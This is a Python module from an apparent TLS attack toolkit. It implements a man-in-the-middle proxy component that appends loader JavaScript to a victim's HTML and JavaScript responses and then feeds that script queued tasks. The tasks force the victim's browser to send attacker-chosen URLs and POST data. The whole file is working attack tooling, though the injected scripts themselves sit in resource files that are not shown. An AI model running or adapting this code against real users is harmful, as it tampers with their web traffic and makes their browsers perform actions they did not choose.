import time
import urllib.parse
import os
import uuid
import json
import traceback
import logging

from tls_attack.proxy.HTTPProxyServer import *

# Delay between each attempt in seconds to injection 
# malicious JavaScript in a HTTP response
SCRIPT_INJECTION_DELAY = 10

# Static content of the module used for the injection
# and the communication
CURRENT_FOLDER = os.path.dirname(os.path.realpath(__file__)) + "/"
HTML_INJECTION_CONTENT       = bytes(open(CURRENT_FOLDER + "resources/injection.html").read(), "ascii")
JAVASCRIPT_INJECTION_CONTENT = bytes(open(CURRENT_FOLDER + "resources/injection.js").read(), "ascii")
JAVASCRIPT_MAIN_MODULE       = bytes(open(CURRENT_FOLDER + "resources/force_request.js").read(), "ascii")

# Static HTTPResponse
EMPTY_RESPONSE = HTTPResponse.create_response_from_content(b"", b"application/json")

class ForceRequest:
    def __init__(self, proxy):
        self.proxy = proxy
        self.is_started = False
        self.queue = {}

    # Starts the attack module. Nothing will be performed until this 
    # method is called.
    def start(self):
        if not self.is_started:
            self.proxy.on_url_request(self._on_url_request)
            self.proxy.on_url_response(self._on_url_response)
            self.is_started = True

    # Forces the target (source_ip) to execute the request with the given url 
    # and post_data. The callback will be invoked after the request was forced.
    def force_request(self, source_ip, url, post_data = None, callback = None):
        if not source_ip in self.queue:
            queue_id = str(uuid.uuid4()).replace("-", "")
            self.queue[source_ip] = { "task" : [], "id" : bytes(queue_id, "ascii") }

        task = ForceRequestTask(url, post_data, callback)
        self.queue[source_ip]["task"].append(task)

    # Injects the initial script in the content of the response
    def _inject_response(self, queue_id, queue, response):
        if not b"Content-Type" in response.headers:
            return

        result = None

        if response.headers[b"Content-Type"] == b"text/html":
            logging.warning("Injection loader script in HTML content.")
            content = HTML_INJECTION_CONTENT.replace(b"%s", queue_id)
            result = response.append_body(content)

        if response.headers[b"Content-Type"] == b"text/javascript":
            logging.warning("Injection loader script in JavaScript content.")
            content = JAVASCRIPT_INJECTION_CONTENT.replace(b"%s", queue_id)
            result = response.append_body(content)

        if not result is None:
            # We mark all the request as attempted to prevent 2 scripts from doing
            # the exact same job. If it fails, it will be attempted again after
            # the SCRIPT_INJECTION_DELAY delay.
            for task in queue["task"]:
                task.last_attempt = time.time()

            return result

    def _process_message(self, queue_id, queue, message):
        if message == b"script.js":
            content = JAVASCRIPT_MAIN_MODULE.replace(b"%s", queue_id)
            return HTTPResponse.create_response_from_content(content, b"text/javascript")

        # Message to retrieve the next request to force
        if message == b"get_task":
            if len(queue["task"]) == 0:
                return EMPTY_RESPONSE

            task = json.dumps(queue["task"][0].__dict__)
            return HTTPResponse.create_response_from_content(bytes(task, "ascii"), b"application/json")

        # Message to tell the server that the last request was 
        # sucessfully forced
        if message.find(b"task_done/") == 0:
            if len(queue["task"]) == 0:
                return EMPTY_RESPONSE

            try:
                task_id = message[10:]
                task = queue["task"][0]

                # If the ID is not the same, it's a previous request that 
                # was already reported as completed.
                if not task_id == bytes(task.id, "ascii"):
                    return EMPTY_RESPONSE

                queue["task"].pop(0)
                task.callback(task)
            except Exception as e:
                logging.error(traceback.format_exc())

            response = json.dumps("OK")
            return HTTPResponse.create_response_from_content(bytes(response, "ascii"), b"application/json")

    def _on_url_request(self, connection, request):
        for source_ip in self.queue:
            # We use a random prefix URL to identify request that are 
            # communication to this module instead of the real server.
            # For those request, we will provide a custom response and 
            # no request will be done to the actual server.
            queue = self.queue[source_ip]
            queue_id = queue["id"]
            url_start = b"/" + queue_id + b"/"

            if request.url.find(url_start) == 0:

                message = request.url[len(url_start):]
                return self._process_message(queue_id, queue, message)


    # The script injection is done in the response part.
    # We use this to sneak in the content we want.
    def _on_url_response(self, connection, request, response):
        if connection.source_ip in self.queue:
            force_queue = self.queue[connection.source_ip]

            if len(force_queue["task"]) > 0:
                if force_queue["task"][0].last_attempt < time.time() - SCRIPT_INJECTION_DELAY:
                    return self._inject_response(force_queue["id"], force_queue, response)


class ForceRequestTask:
    def __init__(self, url, post_data, callback):
        self.url = url
        self.post_data = "" if post_data is None else post_data
        self.callback = callback
        self.last_attempt = time.time()
        self.id = str(uuid.uuid4()).replace("-", "")